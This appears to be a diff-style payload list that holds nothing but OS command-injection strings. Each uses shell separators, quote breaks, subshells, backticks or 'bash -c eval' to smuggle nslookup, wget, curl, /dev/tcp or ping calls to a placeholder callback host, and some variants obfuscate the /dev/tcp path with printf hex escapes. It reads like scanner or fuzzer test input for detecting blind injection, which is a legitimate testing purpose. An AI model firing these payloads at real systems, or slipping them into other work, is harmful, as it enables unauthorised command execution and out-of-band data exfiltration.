+"; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+'; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+'; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+bash -c "$@" x eval nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+bash -c "$@" x eval nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+$(nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+$(nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+`nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+`nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; 
+; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; 
+; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; 
+; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; 
+ && false || wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null && 
+ && false || wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null && 
+ && false || wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1 && 
+ && false || wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1 && 
+"; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; "
+"; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; "
+'; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; '
+'; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null; '
+"; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; "
+"; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; "
+'; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; '
+'; wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null 2>&1; '
+wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null
+wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null
+bash -c "$@" x eval wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null;
+bash -c "$@" x eval wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null;
+$(wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null)
+$(wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null)
+`wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null`
+`wget http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ -O /dev/null`
+; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; 
+; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; 
+; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; 
+; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; 
+ && false || curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ && 
+ && false || curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ && 
+ && false || curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1 && 
+ && false || curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1 && 
+"; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; "
+"; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; "
+'; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; '
+'; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/; '
+"; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; "
+"; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; "
+'; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; '
+'; curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/ 2>&1; '
+curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/
+curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/
+bash -c "$@" x eval curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/;
+bash -c "$@" x eval curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/;
+$(curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/)
+$(curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/)
+`curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/`
+`curl http://e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/`
+; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+ && false || curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+ && false || curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+"; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+"; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+'; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+'; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+"; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+"; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+'; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+'; curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+bash -c "$@" x eval curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+bash -c "$@" x eval curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+$(curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+$(curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+`curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+`curl e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; 
+; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; 
+; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; 
+; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; 
+ && false || true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 && 
+ && false || true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 && 
+ && false || true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1 && 
+ && false || true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1 && 
+"; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; "
+"; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; "
+'; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; '
+'; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80; '
+"; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; "
+"; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; "
+'; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; '
+'; true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80 2>&1; '
+true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80
+true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80
+bash -c "$@" x eval true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80;
+bash -c "$@" x eval true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80;
+$(true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80)
+$(true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80)
+`true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80`
+`true < /dev/tcp/e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78/80`
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1 && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1 && 
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; "
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; "
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; '
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"; '
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; "
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; "
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; '
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)" 2>&1; '
+true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"
+true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"
+bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)";
+bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)";
+$(true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)")
+$(true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)")
+`true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"`
+`true < "$(printf \\x2fdev\\x2ftcp\\x2fe7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78\\x2f80)"`
+ & ping -n 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 & 
+ & ping -n 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 & 
+ & nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 & 
+ & nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 & 
